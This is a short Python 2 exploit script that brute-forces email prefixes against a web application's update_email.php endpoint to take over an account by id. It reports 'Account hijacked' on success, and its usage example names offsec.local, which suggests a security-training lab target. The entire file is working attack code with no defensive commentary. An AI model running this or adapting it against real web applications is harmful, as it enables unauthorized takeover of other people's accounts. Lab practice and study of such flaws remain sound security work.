import hashlib, string, itertools, re, sys, requests
import time

def update_email(ip, domin , id, prefix_length):
	count = 0
	
	for word in itertools.imap(''.join, itertools.product(string.lowercase, repeat=int(prefix_length))):
		email = "%s@%s" % (word,domin)  
		url = "http://%s/update_email.php?e=%s&m=0&id=%s" % (ip, email, id)
		print"(*) Issuing update request to URL: %s " % url
		r = requests.get(url, allow_redirects=False)
		res = r.text
		if "Email address has been updated" in res:
			return (True, email, count)
		else:
			count += 1
	return (False, '', count)

def main():
	if len(sys.argv) != 5:
		print '(+) usage: %s <domin_name> <id> <prefix_length> <hostname>' % sys.argv[0]
		print '(+) eg: %s offsec.local 1 4 localhost' % sys.argv[0]
		sys.exit(-1)

	domin = sys.argv[1]
	id = sys.argv[2]
	prefix_length = sys.argv[3]
	ip = sys.argv[4]
	start_time = time.time()
	result, email , c = update_email(ip,domin, id, prefix_length)

	if (result):
		print "(+) Account hijacked with email %s using %d requests!" % (email, c)
		print("--- %s seconds ---\n" % (time.time() - start_time))
	else:
		print "(-) Account hijacked failed!"

	
main()
